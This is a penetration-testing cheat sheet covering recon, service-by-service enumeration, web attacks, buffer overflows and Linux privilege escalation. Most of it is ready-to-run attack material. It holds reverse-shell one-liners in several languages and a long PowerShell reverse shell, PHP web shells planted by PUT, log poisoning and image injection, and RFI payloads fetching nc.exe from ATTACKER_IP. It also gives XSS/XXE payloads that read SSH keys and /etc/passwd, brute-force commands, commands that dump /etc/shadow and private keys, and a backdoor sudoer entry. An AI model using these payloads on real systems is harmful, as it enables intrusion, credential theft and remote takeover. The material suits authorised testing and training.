# Recon :

```bash
# Enumerate subnet
nmap -sn 10.10.10.1/24
```

```bash
# Fast simple scan
nmap -sS 10.10.10.1/24
```

```sh
export IP=10.10.10.11
```

```bash
# Extracting Live IPs from Nmap Scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

```

```bash
# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
```

```bash
# Autorecon
python3 autorecon.py $IP
```

```bash
# Scan for UDP
nmap $IP -sU
unicornscan -mU -v -I $IP
```

```
# Connect to udp if one is open
nc -u $IP 48772
```

```
# Responder
responder -I eth0 -A
```

```
# Amass
amass enum $IP
```

```bash
# Generating nice scan report
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```
```bash 
#Simple Port Knocking
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```


## File enumeration :

### Common :

```bash
# Check real file type
file file.xxx
```

```bash
# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars
```


```bash
# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract
```

```bash
# Check as binary file in hex
ghex file.xxx
```

```bash
# Check metadata
exiftool file.xxx
```

```sh
# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```
### Disk files

```sh
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

### Images

```sh
#Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar
```

```sh
# Stegpy
stegpy -p file.png
```

```sh
# Check png corrupted
pngcheck -v image.jpeg
```

```sh
# Check what kind of image is
identify -verbose image.jpeg
```

### Audio
```sh
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb
```
```sh
#AudioStego
hideme stego.mp3 -f && cat output.txt 
```

## Port 21 - FTP
```
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP
```

## Port 22 - SSH

```sh
# BruteForce:

patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'
```
```sh
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
```
```sh
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
```
```sh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
```

```sh
#Msf
use auxiliary/fuzzers/ssh/ssh_version_2
```
```sh
#SSH Enum users < 7.7:

python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt $IP 2>/dev/null | grep "is a"
```

https://github.com/six2dez/ssh_enum_script

https://www.exploit-db.com/exploits/45233

### Port 25 - Telnet
```sh
# nc
nc -nvv $IP 25
HELO foo<cr><lf>

# telnet
telnet $IP 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP

smtp-user-enum -M VRFY -U /your_names.txt -t $IP

Send email unauth:
MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test
```
### Port 53 - DNS 
```bash
# DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```
### Port 69 - UDP - TFTP
```sh
nmap -p69 --script=tftp-enum.nse $ip
```

### Kerberos - 88

```sh
GET USERS:

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" $IP
msf> use auxiliary/gather/kerberos_enumusers

https://www.tarlogic.com/blog/como-funciona-kerberos/
https://www.tarlogic.com/blog/como-atacar-kerberos/

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

```
> https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
> https://www.youtube.com/watch?v=snGeZlDQL2Q

### Port 110 - POP3

```sh
telnet $IP
USER pelle@$IP
PASS admin

or:

USER admin
PASS admin
```
### Port 111 - Rpcbind

```sh
rpcinfo -p $IP
rpcclient -U "" $IP
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```

### Port 135 - MSRPC

```bash
nmap $IP --script=msrpc-enum
# Msf
msf > use exploit/windows/dcerpc/ms03_026_dcom
```
### Port 139/445 - SMB
```bash
# Enum hostname
enum4linux -n $IP
nmblookup -A $IP
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP

# Get Version
smbver.sh $IP
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 
smbclient -L \\\\$IP

# Get Shares
smbmap -H  $IP -R <sharename>
echo exit | smbclient -L \\\\
smbclient \\\\$IP\\<share>
smbclient -L //$IP -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP
smbclient -L \\\\$IP\\

# Check null sessions
smbmap -H $IP
rpcclient -U "" -N $IP
smbclient //$IP/IPC$ -N

# Exploit null sessions
enum -s $IP
enum -U $IP
enum -P $IP
enum4linux -a $IP
/usr/share/doc/python3-impacket/examples/samrdump.py $IP

# Connect to username shares
smbclient //$IP/share -U username

# Connect to share anonymously
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
rpcclient -U " " $IP
rpcclient -U " " -N $IP

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn $IP

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost $IP; run

# Bruteforce login
medusa -h $IP -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $IP  -vvvv
nmap –script smb-brute $IP

# nmap smb enum & vuln 

nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $IP

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $IP

# Mount smb volume linux
mount -t cifs -o username=user,password=password //$IP/share /mnt/share

# rpcclient commands
rpcclient -U "" $IP
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

# Run cmd over smb from linux
winexe -U username //$IP "cmd.exe" --system

# smbmap
    #Enum
smbmap.py -H $IP -u administrator -p asdf1234 
    #RCE
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $IP 
    # Drive Listing
smbmap.py -H $IP -u username -p 'P@$$w0rd1234!' -L 
    # Reverse Shell
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H $IP -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "

```
### Port 161/162 UDP - SNMP
```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP

snmp-check $IP -c public|private|community

snmpwalk -v 2c -c public $ip

```
### LDAP - 389,636

```bash
ldapsearch -h $IP -p 389 -x -b "dc=mywebsite,dc=com"

ldapsearch -x -h $IP -D 'DOMAIN\user' -w 'hash-password'

ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'
#brut
patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```

### HTTPS - 443 
- Read the actual SSL CERT to:
    * find out potential correct vhost to GET
    * is the clock skewed
    * any names that could be usernames for bruteforce/guessing.

```bash
sslscan $IP:443
nmap -sV --script=ssl-heartbleed $IP
```
### 500 - ISAKMP IKE
```bash
ike-scan $IP
```
### 513 - Rlogin
```bash
apt install rsh-client
rlogin -l root $IP
```
### 541 - FortiNet SSLVPN
` \x90 `

### Port 554 - RTSP

- Web interface, transfer images, streaming

### Port 1030/1032/1033/1038

- Used by RPC to connect in domain network.

### MSSQL - 1433
```bash
nmap -p 1433 -sU --script=ms-sql-info.nse $IP
sqsh -S $IP -U sa
	xp_cmdshell 'date'
  	go

#msfconsole
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
```
### Port 1521 - Oracle
```bash
oscanner -s $IP -P 1521
tnscmd10g version -h $IP
tnscmd10g status -h $IP
nmap -p 1521 -A $IP
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
#MSF
use auxiliary/admin/oracle  
use auxiliary/scanner/oracle
```
### Port 2049 - NFS
```bash
showmount -e $IP
```

* If you find anything you can mount it like this:
```sh
mount $IP:/ /tmp/NFS
mount -t $IP:/ /tmp/NFS
```
### Port 2100 - Oracle XML DB
```sh
#FTP 
	sys:sys
	scott:tiger
```
 - list of passwords :
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

### MySQL - 3306
```bash
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse $IP -p 3306

mysql --host=$IP -u root -p
```
### Port 3339 - Oracle web interface

Basic info about web service (apache, nginx, IIS)

### RDP - 3389
```bash
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
rdesktop -u username -p password -g 85% -r disk:share=/root/ $IP
rdesktop -u guest -p guest $IP -g 94%
```
### WinRM - 5985
```bash
gem install evil-winrm
evil-winrm -i $IP -u Administrator -p 'password1'
evil-winrm -i $IP -u Administrator -H 'hash-pass'

#Msf
msf > use auxiliary/scanner/winrm/winrm_login
    #Bruteforce 
msf > use auxiliary/scanner/winrm/winrm_login
    #Running Commands 
msf > use auxiliary/scanner/winrm/winrm_cmd
    #Getting Shells! 
msf > use exploit/windows/winrm/winrm_script_exec

```
### VNC - 5985
`\x90 `
### Redis - 6379
```bash
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
```
### MsDeploy - 8172
Microsoft IIS Deploy port
```
$IP:8172/msdeploy.axd
```
### Webdav
```
davtest -cleanup -url http://$IP
cadaver http://$IP
```
### Unknown ports
```
amap -d $IP 8000
```
netcat: makes connections to ports. Can echo strings or give shells:
```
nc -nv $IP 110
```
Try zone transfer for subdomains:
```
dig axfr @$IP hostname.box
dnsenum $IP
dnsrecon -d domain.com -t axfr```
### Port 80 - web server
    Navigate && robots.txt
    Headers
    Source Code
```
```bash
# Nikto
nikto -h http://$ip
```

```bash
# CMS Explorer
cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]
```

```bash
# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp
wpscan --url http://$IP --enumerate vt
wpscan --url http://$IP --enumerate u
wpscan -e --url https://url.com

```

```bash
# Enum User:

for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}';done
```

```bash
# Joomscan
joomscan -u  http://$IP
joomscan -u  http://$IP --enumerate-components
```

```bash
# Get header
curl -i $IP

# Get options
curl -i -X OPTIONS $IP

	# With PUT option enabled:

	nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
	&& http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L $IP
curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080

# Check for title and all links
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl $IP -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

# Google Dork

site:domain.com intext:user

https://github.com/sushiwushi/bug-bounty-dorks
```
#### Url Brutforce
```
# Ffuf
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.11.1.11/mvc/FUZZ

# Dirb not recursive
dirb http://$IP -r -o dirb-$IP.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

# dirseache
https://github.com/maurosoria/dirsearch

./dirsearch.py -u 10.10.10.157 -e php

./dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40


# Crawl:

dirhunt https://url.com/
hakrwaler https://url.com/

# Fuzzer:

ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ

# Sub domain brut
https://github.com/aboul3la/Sublist3r
```
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md

#### Default_Weak login
```
site:domain.com password

admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```
> list of user names

https://github.com/danielmiessler/SecLists/tree/master/Usernames

#### LFI-RFI
```
#Fimap
fimap -u "http://$IP/example.php?test="

curl -s http://$IP/gallery.php?page=/etc/passwd

#Use in "page="

php://filter/convert.base64-encode/resource=/etc/passwd

http://$IP/maliciousfile.txt%00

php://filter/convert.base64-encode/resource=../config.php

php://filter/convert.base64-encode/resource=../../../../../boot.ini

# LFI Windows

http://$IP/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Contaminating log files
root@kali:~# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 

# Contaminating log files
[root:~]# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

http://$IP/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://$IP/addguestbook.php?LANG=http://$IP:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>


# PHP Filter:
http://$IP/index.php?m=php://filter/convert.base64-encode/resource=config

# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
  Start SMB Server in attacker machine and put evil script
  Access it via browser (2 request attack):
   http://$IP/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
   http://$IP/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
```
> read this :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

#### Sql-injection
```
#POST
sqlmap.py -r search-test.txt

#GET
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql

#FULL ;)
sqlmap -u 'http://$IP:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch

# NoSQL
' || 'a'=='a

#in URL
username[$ne]=0xtz&password[$ne]=0xtz

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

#### XSS
```
<script>alert("XSS")</script>
<script>alert(1)</script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

#Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>hack  &book;</thp>


#Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack
%26book%3B</thp>

```
#### Sql-login Bypass

>Open Burp-suite
Make and intercept a request
Send to intruder
Cluster attack.
Paste in sqlibypass-list 
    https://bobloblaw.gitbooks.io/security/content/sql-injections.html
Attack
Check for response length variation

#### Bypass img Upload 

```
Change extension: .pHp3 or pHp3.jpg
Modify mimetype: Content-type: image/jpeg
Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
Add gif header: GIF89a;
All at the same time.
# inject PHP into img

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' shell.jpeg

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg

```

#Online crackers

https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/

#### Vulnerability analysis

## Buffer Overflow
```bash
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E$IP offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
... )
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
 5.1 AWESOME WAY TO CHECK BADCHARS ( https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ ):
    a. !mona config -set workingfolder c:\logs\%p
    b. !mona bytearray -b "\x00\x0d"
    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
    e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"
6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode


```
## Find xploits - Searchsploit and google
```bash
#Google
site:exploit-db.com apache 2.X.X

searchsploit Apache 2.X.X
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

```
## Reverse Sells
```bash
# Linux
bash -i >& /dev/tcp/$IP/4443 0>&1

/bin/sh -i > /dev/tcp/x.x.x.x/6969 0<&1 2>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4443 >/tmp/f

nc -e /bin/sh $IP 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="$IP";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe $IP 4443

# from cmd
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')

# PowerShell
PS C:\>IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')


# PHP
<?php $sock = fsockopen("$IP",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>

php -r '$sock=fsockopen("x.x.x.x",6969);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",6969).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#OR use rsg

https://github.com/mthbernardes/rsg
rsg <interface> <port>
```
# Privilege escalation

## Common

### Set up Webserver
```bash
python -m SimpleHTTPServer 80
python3 -m http.server 
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
https://github.com/sc0tfree/updogupdog
```
### Set up FTP Server

```bash
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

## Linux
* Useful commands
```bash
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
stty raw -echo
fg
reset
Ctrl+Z
stty size
stty -rows 48 -columns 120
fg

echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /opt/privesc-scripts; python -m SimpleHTTPServer 80

# Download all files
wget http://$IP:8080/ -r; mv $IP exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

```
	
### Basic info
```bash
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload linuxprivchecker.py
upload LinEnum.sh

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check

```
### Kernel exploits
```bash
site:exploit-db.com kernel version

perl /opt/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended

```
### Programs running as root
```bash
ps aux
```
### Installed software
```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info

```
### Weak/reused/plaintext passwords
* Check database config-file
* Check databases
* Check weak passwords
```bash
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```
```bash
./LinEnum.sh -t -k password
```
### Inside service
```bash
netstat -anlp
netstat -ano
```
### Suid misconfiguration

 - Binary with suid permission can be run by anyone, but when they are run they are run as root!
```bash
nmap
vim
nano
curl
...
```
```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```
### Unmounted filesystems
```bash
mount -l
```
### Cronjob
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
### SSH Keys
 * Chek all home dirs
```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

```
### Bad path configuration
```bash
# Require user interaction
export PATH=/tmp' or your path file':$PATH
```
### Find plain passwords
```bash
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
